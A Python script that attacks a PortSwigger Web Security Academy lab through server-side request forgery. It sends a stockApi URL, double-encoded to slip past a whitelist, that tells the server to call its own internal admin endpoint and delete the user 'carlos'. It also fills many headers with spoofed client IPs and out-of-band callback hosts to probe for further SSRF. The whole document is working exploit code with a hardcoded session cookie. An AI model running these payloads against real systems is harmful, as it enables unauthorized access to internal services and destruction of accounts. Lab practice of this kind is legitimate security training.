import requests
from urllib.parse import quote

url = "https://0a1d004304caef5d81e3432300810032.web-security-academy.net/product/stock"

headers = {
    "Host": "0a1d004304caef5d81e3432300810032.web-security-academy.net",
    "Cookie": "session=doMIZznHbCoJsnQoDehN9mjFOXnH0BG8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Sec-Ch-Ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@3y2mxsstj08l82rsacfae68qfhlem2b.oastify.com",
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Accept": "*/*",
    "Origin": "https://0a1d004304caef5d81e3432300810032.web-security-academy.net",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://2illhrcs3zsks1brubz9y5spzg5d71w.oastify.com/ref",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Priority": "u=1, i",
    "Cache-Control": "no-transform",
    "From": "root@59co8u3vu2jnj42uleqcp8jsqjwgs4h.oastify.com",
    "X-Wap-Profile": "http://468n5t0ur1gmg3ztidnbm7grnitfq3f.oastify.com/wap.xml",
    "X-Forwarded-For": "spoofed.o4t73dyeple6enxdgxlvkrebl2rzpne.oastify.com",
    "X-Real-Ip": "spoofed.vhgegkbl2srdruakt4y2xyriy9463us.oastify.com",
    "Client-Ip": "spoofed.z66i5o0prwghgyzoi8n6m2gmndtatyi.oastify.com",
    "Cf-Connecting_ip": "spoofed.h4m036y7peezegx6gqlokke4lvrsugj.oastify.com",
    "X-Originating-Ip": "spoofed.7jrqiwdx44tpt6cwvg0ezatu0l6ia6z.oastify.com",
    "Forwarded": "for=spoofed.2qtlprksbz0k01jr2b79650p7gddi17.oastify.com;by=spoofed.2qtlprksbz0k01jr2b79650p7gddi17.oastify.com;host=spoofed.2qtlprksbz0k01jr2b79650p7gddi17.oastify.com",
    "X-Client-Ip": "spoofed.ds9wr2m3da2v2cl24m9k8g209rfp5du.oastify.com",
    "True-Client-Ip": "spoofed.ct9vs1n2e93u3bm15laj9f3zaqgo7cw.oastify.com",
    "Contact": "root@kth3s9naeh323jm95tar9n37aygw8kx.oastify.com"
}

stockApi = "http://localhost#@stock.weliketoshop.net/admin/delete?username=carlos"

encoded_stockApi = stockApi.replace('#', '%2523')

data = {
    "stockApi": encoded_stockApi
}


response = requests.post(url, headers=headers, data=data)

print(response.status_code)
print(response.text)
